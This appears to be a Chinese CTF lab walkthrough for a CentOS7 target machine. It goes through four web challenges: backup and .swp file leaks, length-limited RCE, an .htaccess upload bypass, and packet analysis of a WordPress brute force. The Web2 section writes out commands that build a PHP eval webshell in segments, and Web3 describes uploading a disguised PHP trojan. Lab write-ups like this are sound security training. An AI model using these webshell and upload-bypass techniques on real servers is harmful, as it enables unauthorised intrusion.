CentOS7 靶机（2025 年第一期）

链接: https://pan.baidu.com/s/1oNwcGllegwMzoIEd3GPcKg?pwd=rf9z 提取码: rf9z

开机时选择第二个进入

信息收集

扫描存活主机

发现目标主机 192.168.83.136

深入扫描

Web1

信息泄露（备份文件 + .swp 文件）

进入 Web1 关卡，提示了敏感信息泄露

直接开扫，拿到备份文件

下载后解压缩拿到一份 info.txt 文件

打开拿到提示

直接访问 config.inc.swp 是空白页，查看源代码拿到 Key

Web2

RCE（内容写入文件绕过无回显 + 分段写入绕过长度限制）

页面底部显示的 IP 是 192.168.83.135

因为有长度限制，分三段写入 webshell（每段都 ≤30 字符）

面对无回显的绕过方式则是文件落地

# cmd（解码后） 长度 作用
1 echo ‘<?php’>1 14 新建文件 1，内容 <?php
2 echo ‘eval($_POST[c]);’>>1 26 追加一句话
3 mv 1 1.php 10 改名为可解析的 .php

蚁剑连接成功

成功找到 Key

Web3

文件上传（.htaccess 绕过）

访问过去提示只能上传图片类文件

概述来说 .htaccess 文件是 Apachse 服务器中的一个配置文件，它负责相关目录下的网页配置

通过 .htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能

而我们就是运用到它可以改变文件扩展名，可以把特定文件转化成php执行的特性来进行文件上传漏洞利用

上传 .htaccess 文件

上传后缀是图片类型的 PHP 木马

连接成功

拿到 Key

Web4

流量分析（目录扫描 + 爆破 + RCE）

因为是靶机所以我直接连接上去拿的文件

打开协议看到有 HTTP 直接过滤掉，前面一部分都是在扫描后台

后面在爆破 WordPress 账号密码

这里登录成功了，虽然是 302 跳转但是已经发了凭证

这里 RCE 直接脱库下来了

解码拿到压缩包密码

导出对象中搜索 ZIP 快速找到这个文件

用密码解压缩后拿到 Key
